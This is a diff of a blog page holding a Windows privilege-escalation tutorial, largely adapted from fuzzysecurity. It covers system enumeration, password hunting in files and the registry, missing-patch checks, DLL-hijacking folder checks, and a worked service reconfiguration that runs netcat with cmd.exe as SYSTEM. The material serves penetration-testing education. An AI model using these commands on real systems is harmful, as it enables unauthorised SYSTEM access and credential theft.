@@ -13,18 +13,18 @@
     
 
     
-    <meta name="description" content="Windows Privilege Escalation Fundamentals Windows Privilege Escalation Fundamentals 终极目标：获取系统权限(system) 信息收集主机与用户信息systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&amp;quot;hostnameecho">
+    <meta name="description" content="Windows Privilege Escalation Fundamentals Windows Privilege Escalation Fundamentals 终极目标：获取系统权限(system)  信息收集  主机与用户信息 systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&amp;quot;hostnamee">
 <meta name="keywords" content="Network Security">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Windows Privilege Escalation Fundamentals">
 <meta property="og:url" content="http://flamepeak.com/2019/04/18/Windows-Privilege-Escalation-Fundamentals-20190418/index.html">
 <meta property="og:site_name" content="FlamePeak">
-<meta property="og:description" content="Windows Privilege Escalation Fundamentals Windows Privilege Escalation Fundamentals 终极目标：获取系统权限(system) 信息收集主机与用户信息systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&amp;quot;hostnameecho">
+<meta property="og:description" content="Windows Privilege Escalation Fundamentals Windows Privilege Escalation Fundamentals 终极目标：获取系统权限(system)  信息收集  主机与用户信息 systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&amp;quot;hostnamee">
 <meta property="og:locale" content="default">
 <meta property="og:updated_time" content="2019-04-19T00:56:18.171Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Windows Privilege Escalation Fundamentals">
-<meta name="twitter:description" content="Windows Privilege Escalation Fundamentals Windows Privilege Escalation Fundamentals 终极目标：获取系统权限(system) 信息收集主机与用户信息systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&amp;quot;hostnameecho">
+<meta name="twitter:description" content="Windows Privilege Escalation Fundamentals Windows Privilege Escalation Fundamentals 终极目标：获取系统权限(system)  信息收集  主机与用户信息 systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&amp;quot;hostnamee">
 
     
     <link rel="alternative" href="/atom.xml" title="FlamePeak" type="application/atom+xml">
@@ -100,58 +100,57 @@
 		<p>Windows Privilege Escalation Fundamentals</p>
 <p><a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">Windows Privilege Escalation Fundamentals</a></p>
 <p>终极目标：获取系统权限(system)</p>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主机与用户信息"><a href="#主机与用户信息" class="headerlink" title="主机与用户信息"></a>主机与用户信息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line"></span><br><span class="line">hostname</span><br><span class="line"></span><br><span class="line">echo %username%</span><br><span class="line"></span><br><span class="line">net users</span><br><span class="line"></span><br><span class="line">net user user1</span><br></pre></td></tr></table></figure>
-
-<h4 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line"></span><br><span class="line">route print</span><br><span class="line"></span><br><span class="line">arp -a</span><br><span class="line">#arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces.</span><br><span class="line"></span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line"># The netsh firewall commands are only available from XP SP2 and upwards.</span><br><span class="line">netsh firewall show state</span><br><span class="line"></span><br><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure>
-
-<h4 id="启动项、进程、服务、驱动"><a href="#启动项、进程、服务、驱动" class="headerlink" title="启动项、进程、服务、驱动"></a>启动项、进程、服务、驱动</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks /query /fo list /v</span><br><span class="line"></span><br><span class="line">tasklist /svc</span><br><span class="line">tasklist /m</span><br><span class="line"></span><br><span class="line">#启动服务</span><br><span class="line">net start</span><br><span class="line"></span><br><span class="line">#驱动信息 </span><br><span class="line">#This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes</span><br><span class="line">than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise.</span><br><span class="line"></span><br><span class="line">driverquery</span><br></pre></td></tr></table></figure>
-
-<h3 id="强大的wmic"><a href="#强大的wmic" class="headerlink" title="强大的wmic"></a>强大的wmic</h3><p>Any version of XP <strong>did not</strong> allow access to WMIC from a low privileged account.<br>Contrary, default installations of Windows 7 Professional and Windows 8 Enterprise allowed low privilege users to use WMIC and query the operating system without modifying any settings. </p>
+<h3 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h3>
+<h4 id="主机与用户信息"><a class="markdownIt-Anchor" href="#主机与用户信息"></a> 主机与用户信息</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line"></span><br><span class="line">hostname</span><br><span class="line"></span><br><span class="line">echo %username%</span><br><span class="line"></span><br><span class="line">net users</span><br><span class="line"></span><br><span class="line">net user user1</span><br></pre></td></tr></table></figure>
+<h4 id="网络信息"><a class="markdownIt-Anchor" href="#网络信息"></a> 网络信息</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line"></span><br><span class="line">route print</span><br><span class="line"></span><br><span class="line">arp -a</span><br><span class="line">#arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces.</span><br><span class="line"></span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line"># The netsh firewall commands are only available from XP SP2 and upwards.</span><br><span class="line">netsh firewall show state</span><br><span class="line"></span><br><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure>
+<h4 id="启动项-进程-服务-驱动"><a class="markdownIt-Anchor" href="#启动项-进程-服务-驱动"></a> 启动项、进程、服务、驱动</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks /query /fo list /v</span><br><span class="line"></span><br><span class="line">tasklist /svc</span><br><span class="line">tasklist /m</span><br><span class="line"></span><br><span class="line">#启动服务</span><br><span class="line">net start</span><br><span class="line"></span><br><span class="line">#驱动信息 </span><br><span class="line">#This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes</span><br><span class="line">than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise.</span><br><span class="line"></span><br><span class="line">driverquery</span><br></pre></td></tr></table></figure>
+<h3 id="强大的wmic"><a class="markdownIt-Anchor" href="#强大的wmic"></a> 强大的wmic</h3>
+<p>Any version of XP <strong>did not</strong> allow access to WMIC from a low privileged account.<br>
+Contrary, default installations of Windows 7 Professional and Windows 8 Enterprise allowed low privilege users to use WMIC and query the operating system without modifying any settings.</p>
 <p>原作者编写的一个使用wmic获取系统信息的批处理：<a href="http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar" target="_blank" rel="noopener">here</a></p>
 <p>wmic_info.bat</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for /f &quot;delims=&quot; %%A in (&apos;dir /s /b %WINDIR%\system32\*htable.xsl&apos;) do set &quot;var=%%A&quot;</span><br><span class="line"></span><br><span class="line">wmic process get CSName,Description,ExecutablePath,ProcessId /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic USERACCOUNT list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic group list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic nicconfig where IPEnabled=&apos;true&apos; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic netuse list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic startup get Caption,Command,Location,User /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br></pre></td></tr></table></figure>
-
-<h3 id="寻找可以利用的漏洞"><a href="#寻找可以利用的漏洞" class="headerlink" title="寻找可以利用的漏洞"></a>寻找可以利用的漏洞</h3><p>收集信息的目的是利用信息，找到可以利用的漏洞，提权、隐藏自己。纯粹的收集信息是徒劳的。</p>
-<h4 id="首先，我们要查看系统补丁安装情况。"><a href="#首先，我们要查看系统补丁安装情况。" class="headerlink" title="首先，我们要查看系统补丁安装情况。"></a>首先，我们要查看系统补丁安装情况。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic qfe get caption, description, hotfixid, InstalledOn</span><br></pre></td></tr></table></figure>
-
-<p>重要的提权漏洞编号：<br>KiTrap0D (KB979682)<br>MS11-011 (KB2393802)<br>MS10-059 (KB982799)<br>MS10-021 (KB979683)<br>MS11-080 (KB2592799)</p>
+<h3 id="寻找可以利用的漏洞"><a class="markdownIt-Anchor" href="#寻找可以利用的漏洞"></a> 寻找可以利用的漏洞</h3>
+<p>收集信息的目的是利用信息，找到可以利用的漏洞，提权、隐藏自己。纯粹的收集信息是徒劳的。</p>
+<h4 id="首先我们要查看系统补丁安装情况"><a class="markdownIt-Anchor" href="#首先我们要查看系统补丁安装情况"></a> 首先，我们要查看系统补丁安装情况。</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic qfe get caption, description, hotfixid, InstalledOn</span><br></pre></td></tr></table></figure>
+<p>重要的提权漏洞编号：<br>
+KiTrap0D (KB979682)<br>
+MS11-011 (KB2393802)<br>
+MS10-059 (KB982799)<br>
+MS10-021 (KB979683)<br>
+MS11-080 (KB2592799)</p>
 <p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">windows-kernel-exploits Windows平台提权漏洞集合</a></p>
 <p><a href="https://github.com/WindowsExploits/Exploits" target="_blank" rel="noopener">https://github.com/WindowsExploits/Exploits</a></p>
 <p><a href="https://github.com/AusJock/Privilege-Escalation" target="_blank" rel="noopener">https://github.com/AusJock/Privilege-Escalation</a></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo&gt;micropoor.txt&amp;(for %i in ( KB979682 KB2393802 KB982799 KB979683 KB2592799) do @type micropoor.txt|@find /i &quot;%i&quot;|| @echo %i you can fuck)&amp;del /f /q /a micropoor.txt</span><br></pre></td></tr></table></figure>
-
-<h4 id="应用程序敏感信息"><a href="#应用程序敏感信息" class="headerlink" title="应用程序敏感信息"></a>应用程序敏感信息</h4><p>有些配置文件会包含各种key、password，这些信息可能很有价值</p>
+<h4 id="应用程序敏感信息"><a class="markdownIt-Anchor" href="#应用程序敏感信息"></a> 应用程序敏感信息</h4>
+<p>有些配置文件会包含各种key、password，这些信息可能很有价值</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c:\sysprep.inf</span><br><span class="line">c:\sysprep\sysprep.xml</span><br><span class="line">%WINDIR%\Panther\Unattend\Unattended.xml</span><br><span class="line">%WINDIR%\Panther\Unattended.xml</span><br></pre></td></tr></table></figure>
-
 <p>另外可以通过Groups.xml来获取命令和密码。工具<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" rel="noopener">Get-GPPPassword.ps1</a></p>
 <p>一个关键的注册表项，<code>AlwaysInstallElevated</code>， 如果这个被启用，那么任何权限的用户都可以以<code>NT AUTHORITY\SYSTEM</code>的权限来安装<code>.msi</code>程序。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># This will only work if both registry keys contain &quot;AlwaysInstallElevated&quot; with DWORD values of 1.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br><span class="line">C:\Windows\system32&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
-
 <p>当然，我们可以直接在系统中搜索，可能包含密码信息的文件：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># The command below will search the file system for file names containing certain keywords. You can</span><br><span class="line">specify as many keywords as you wish.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; dir /s *pass* == *cred* == *vnc* == *.config*</span><br><span class="line"></span><br><span class="line"># Search certain file types for a keyword, this can generate a lot of output.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; findstr /si password *.xml *.ini *.txt</span><br><span class="line"></span><br><span class="line"># Similarly the two commands below can be used to grep the registry for keywords, in this case &quot;password&quot;.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">C:\Windows\system32&gt; reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure>
-
-<h3 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># We can use sc to query, configure and manage windows services.</span><br><span class="line">sc qc Spooler</span><br></pre></td></tr></table></figure>
-
+<h3 id="提升权限"><a class="markdownIt-Anchor" href="#提升权限"></a> 提升权限</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># We can use sc to query, configure and manage windows services.</span><br><span class="line">sc qc Spooler</span><br></pre></td></tr></table></figure>
 <p>使用accesschk查看服务、目录、注册表等的权限。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># We can see the permissions that each user level has, you can also use &quot;accesschk.exe -ucqv *&quot; to list</span><br><span class="line">all services.</span><br><span class="line">accesschk.exe -ucqv Spooler</span><br></pre></td></tr></table></figure>
-
 <p>Accesschk can automatically check if we have write access to a Windows service with a certain user level. Generally as a low privilege user we will want to check for “Authenticated Users”. Make sure to check which user groups you user belongs to, “Power Users” for example is considered a low privilege user group (though it is not widely used).</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># This is on Windows 8.</span><br><span class="line"></span><br><span class="line">C:\Users\b33f\tools\Sysinternals&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *</span><br><span class="line">No matching objects found.</span><br><span class="line"></span><br><span class="line"># On a default Windows XP SP0 we can see there is a pretty big security fail.</span><br><span class="line"></span><br><span class="line">C:\&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *</span><br><span class="line">RW SSDPSRV</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">RW upnphost</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">		</span><br><span class="line">C:\&gt; accesschk.exe -ucqv SSDPSRV</span><br><span class="line"></span><br><span class="line">SSDPSRV</span><br><span class="line"></span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Power Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line"></span><br><span class="line">C:\&gt; accesschk.exe -ucqv upnphost</span><br><span class="line"></span><br><span class="line">upnphost</span><br><span class="line"></span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Power Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br></pre></td></tr></table></figure>
-
 <p>This issue was later resolved with the introduction of XP SP2, however on SP0&amp;SP1 it can be used as a universal local privilege escalation vulnerability. By reconfiguring the service we can let it run any binary of our choosing with SYSTEM level privileges.</p>
 <p>Let’s have a look how this is done in practise. In this case the service will execute netcat and open a reverse shell with SYSTEM level privileges. Other options are certainly possible.</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\&gt; sc qc upnphost</span><br><span class="line"></span><br><span class="line">[SC] GetServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: upnphost</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</span><br><span class="line">        START_TYPE         : 3   DEMAND_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host</span><br><span class="line">        DEPENDENCIES       : SSDPSRV</span><br><span class="line">        SERVICE_START_NAME : NT AUTHORITY\LocalService</span><br><span class="line">		</span><br><span class="line">C:\&gt; sc config upnphost binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&quot;</span><br><span class="line">[SC] ChangeServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">C:\&gt; sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</span><br><span class="line">[SC] ChangeServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">C:\&gt; sc qc upnphost</span><br><span class="line"></span><br><span class="line">[SC] GetServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: upnphost</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</span><br><span class="line">        START_TYPE         : 3   DEMAND_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host</span><br><span class="line">        DEPENDENCIES       : SSDPSRV</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br><span class="line">		</span><br><span class="line">C:\&gt; net start upnphost</span><br></pre></td></tr></table></figure>
-
 <p>Elevating privileges by exploiting weak folder permissions</p>
 <p>DLL的加载顺序：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You can see the DLL search order on 32-bit systems below:</span><br><span class="line">1 - The directory from which the application loaded</span><br><span class="line">2 - 32-bit System directory (C:\Windows\System32)</span><br><span class="line">3 - 16-bit System directory (C:\Windows\System)</span><br><span class="line">4 - Windows directory (C:\Windows)</span><br><span class="line">5 - The current working directory (CWD)</span><br><span class="line">6 - Directories in the PATH environment variable (system then user)</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># When executing any of the sysinternals tools for the first time the user will be presented with a GUI</span><br><span class="line">pop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flag</span><br><span class="line">to automatically accept the EULA.</span><br><span class="line"></span><br><span class="line">accesschk.exe /accepteula ... ... ...</span><br><span class="line"></span><br><span class="line"># Find all weak folder permissions per drive.</span><br><span class="line">accesschk.exe -uwdqs Users c:\</span><br><span class="line">accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\</span><br><span class="line"></span><br><span class="line"># Find all weak file permissions per drive.</span><br><span class="line">accesschk.exe -uwqs Users c:\*.*</span><br><span class="line">accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*</span><br></pre></td></tr></table></figure>
-
 <p>关于DLL劫持的详细介绍可以参考：<a href="http://www.greyhathacker.net/?p=738" target="_blank" rel="noopener">Elevating privileges by exploiting weak folder permissions</a></p>
 <p>原作者写的一个判断可以利用的文件夹的powershell脚本：<a href="http://www.greyhathacker.net/docs/folderperm.zip" target="_blank" rel="noopener">folderperm.ps1</a></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Author : Parvez Anwar (@parvezghh)</span><br><span class="line"># Date   : 17/11/13</span><br><span class="line">#</span><br><span class="line"># powershell.exe -executionpolicy bypass -file folderperm.ps1</span><br><span class="line"></span><br><span class="line">$numofpaths  = 0</span><br><span class="line">$countcopies = 0</span><br><span class="line">$filetocopy  = &quot;testfile.txt&quot;</span><br><span class="line"></span><br><span class="line">$myarray = (gi env:path).value.split(&apos;;&apos;)</span><br><span class="line"></span><br><span class="line">Write-Host &quot;&quot; </span><br><span class="line">Write-Host &quot;[i] Number of folder paths :&quot; $myarray.count</span><br><span class="line"></span><br><span class="line"># If the last path entry ends in semi-colon</span><br><span class="line">if ($myarray[$myarray.count-1] -eq &quot;&quot;)</span><br><span class="line">&#123;</span><br><span class="line">   $numofpaths = $myarray.count - 2</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">   $numofpaths = $myarray.count - 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">New-Item $filetocopy -type file | Out-Null</span><br><span class="line"></span><br><span class="line">$FileExists = (Test-Path $filetocopy)</span><br><span class="line"></span><br><span class="line">if (!($FileExists)) </span><br><span class="line">&#123;</span><br><span class="line">    Write-Host &quot;[i] Dummy test file used to test access was not outputted:&quot; $filetocopy</span><br><span class="line">    exit</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Write-Host &quot;[i] Copying and removing test file to path folders where access is granted&quot;</span><br><span class="line"></span><br><span class="line">for($i=0; $i -le $numofpaths; $i++)</span><br><span class="line">&#123;</span><br><span class="line"> if (Test-Path -Path $myarray[$i])</span><br><span class="line"> &#123;</span><br><span class="line">    Copy-Item $filetocopy $myarray[$i] -errorAction SilentlyContinue -errorVariable errors</span><br><span class="line"></span><br><span class="line">    if ($errors.count -le 0)</span><br><span class="line">    &#123;</span><br><span class="line">        Write-Host -foregroundColor Green &quot;      Access granted:&quot; $myarray[$i] </span><br><span class="line">        $countcopies = $countcopies + 1</span><br><span class="line">        $filetoremove = $myarray[$i] + &quot;\&quot; + $filetocopy</span><br><span class="line">        Remove-Item $filetoremove</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">       Write-Host -foregroundColor Red &quot;      Access denied :&quot; $myarray[$i] </span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line">    Write-Host -foregroundColor Blue &quot;      Folder missing:&quot; $myarray[$i] </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">Remove-Item $filetocopy</span><br></pre></td></tr></table></figure>
-
 <p>可以利用的系统服务调用的dll</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Vulnerable Windows Services</span><br><span class="line">Here are Windows Services that have been found to be vulnerable and could be exploited on Windows 7 (32/64)</span><br><span class="line"></span><br><span class="line">IKE and AuthIP IPsec Keying Modules (IKEEXT)                 – wlbsctrl.dll</span><br><span class="line">Windows Media Center Receiver Service (ehRecvr)              – ehETW.dll</span><br><span class="line">Windows Media Center Scheduler Service (ehSched)             – ehETW.dll</span><br><span class="line"></span><br><span class="line">The Windows Media Center Services startup type is set to manual and status not started and will only give us only Network service privileges so I cannot see it to being much use especially with its limited privileges. It can however be started temporarily via certain scheduled tasks.</span><br><span class="line"></span><br><span class="line">schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\mcupdate”</span><br><span class="line">schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\MediaCenterRecoveryTask”</span><br><span class="line">schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\ActivateWindowsSearch”</span><br><span class="line"></span><br><span class="line">A quick check on Windows XP has shown that these Services are vulnerable</span><br><span class="line"></span><br><span class="line">Automatic Updates (wuauserv)                               – ifsproxy.dll</span><br><span class="line">Remote Desktop Help Session Manager (RDSessMgr)            – SalemHook.dll</span><br><span class="line">Remote Access Connection Manager (RasMan)                  – ipbootp.dll</span><br><span class="line">Windows Management Instrumentation (winmgmt)               – wbemcore.dll</span><br><span class="line"></span><br><span class="line">Other Services that might be installed are also vulnerable</span><br><span class="line"></span><br><span class="line">Audio Service (STacSV)                                  – SFFXComm.dll SFCOM.DLL </span><br><span class="line">Intel(R) Rapid Storage Technology (IAStorDataMgrSvc)    – DriverSim.dll</span><br><span class="line">Juniper Unified Network Service(JuniperAccessService)   – dsLogService.dll</span><br><span class="line">Encase Enterprise Agent                                 – SDDisk.dll </span><br><span class="line"></span><br><span class="line">No dll hijacking vulnerabilities were found on a clean default installation of Windows 8 OS (64) so another good reason to start migrating to Windows 8.</span><br></pre></td></tr></table></figure>  
 	</div>
@@ -215,7 +214,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">Contents</strong>
  
- <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息收集"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#主机与用户信息"><span class="toc-number">1.1.</span> <span class="toc-text">主机与用户信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#网络信息"><span class="toc-number">1.2.</span> <span class="toc-text">网络信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#启动项、进程、服务、驱动"><span class="toc-number">1.3.</span> <span class="toc-text">启动项、进程、服务、驱动</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强大的wmic"><span class="toc-number">2.</span> <span class="toc-text">强大的wmic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#寻找可以利用的漏洞"><span class="toc-number">3.</span> <span class="toc-text">寻找可以利用的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#首先，我们要查看系统补丁安装情况。"><span class="toc-number">3.1.</span> <span class="toc-text">首先，我们要查看系统补丁安装情况。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#应用程序敏感信息"><span class="toc-number">3.2.</span> <span class="toc-text">应用程序敏感信息</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提升权限"><span class="toc-number">4.</span> <span class="toc-text">提升权限</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息收集"><span class="toc-number">1.</span> <span class="toc-text"> 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#主机与用户信息"><span class="toc-number">1.1.</span> <span class="toc-text"> 主机与用户信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#网络信息"><span class="toc-number">1.2.</span> <span class="toc-text"> 网络信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#启动项-进程-服务-驱动"><span class="toc-number">1.3.</span> <span class="toc-text"> 启动项、进程、服务、驱动</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强大的wmic"><span class="toc-number">2.</span> <span class="toc-text"> 强大的wmic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#寻找可以利用的漏洞"><span class="toc-number">3.</span> <span class="toc-text"> 寻找可以利用的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#首先我们要查看系统补丁安装情况"><span class="toc-number">3.1.</span> <span class="toc-text"> 首先，我们要查看系统补丁安装情况。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#应用程序敏感信息"><span class="toc-number">3.2.</span> <span class="toc-text"> 应用程序敏感信息</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提升权限"><span class="toc-number">4.</span> <span class="toc-text"> 提升权限</span></a></li></ol>
  
   </div>
 
@@ -305,19 +304,19 @@
 			
 		
 			
-				<li><a href="/tags/Hexo/" title="Hexo">Hexo<sup>10</sup></a></li>
-			
-		
-			
 				<li><a href="/tags/cryptography/" title="cryptography">cryptography<sup>10</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/Life/" title="Life">Life<sup>9</sup></a></li>
+				<li><a href="/tags/Hexo/" title="Hexo">Hexo<sup>10</sup></a></li>
 			
 		
 			
 				<li><a href="/tags/JavaScript/" title="JavaScript">JavaScript<sup>9</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Life/" title="Life">Life<sup>9</sup></a></li>
 			
 		
 			
@@ -333,6 +332,10 @@
 			
 		
 			
+				<li><a href="/tags/Tools/" title="Tools">Tools<sup>4</sup></a></li>
+			
+		
+			
 				<li><a href="/tags/Kali/" title="Kali">Kali<sup>4</sup></a></li>
 			
 		
@@ -341,15 +344,11 @@
 			
 		
 			
